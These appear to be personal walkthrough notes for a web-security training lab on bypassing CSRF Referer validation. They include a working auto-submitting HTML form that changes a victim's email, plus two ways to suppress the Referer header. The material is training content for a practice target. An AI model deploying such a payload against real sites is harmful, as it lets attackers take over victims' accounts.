```bash
1. login: wiener user
2. update: email  &&  send this request to the repeater tab  &&  no CSRF protection

NEW HEADER
Referer: https://lab-id.web-security-academy.net/my-account?id=wiener

TEST CASE
a. update the email amd referer header:  https://google.com
   RESPONSE
   400 Bad request  --  Invalid Referer Header

b. what if we remove the referer header  --  302 Found

3. generate CSRF PoC  --  update the email value

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="appleaeeee@mail.com">
			<input type="submit" value="Submit Request">
		</form>
	</body>
	<script>document.forms[0].submit();</script>
</html>

4. navigate to the exploit server  --  paste the payload  -- view exploit
   RESPONSE  --  invalid referer header  --  the browser atuomatically sets the referer header

BYPASS AUTOMATICALLY ADDING REFERER HEADER
a. add: Referrer-Policy: no-referrer  --  first way
b. add: <meta name="referrer" content="no-referrer">  --  second way

8. go to the exploit server deliver to the victim and done
9. NOTE if you viewed the exploit then update the email value
```
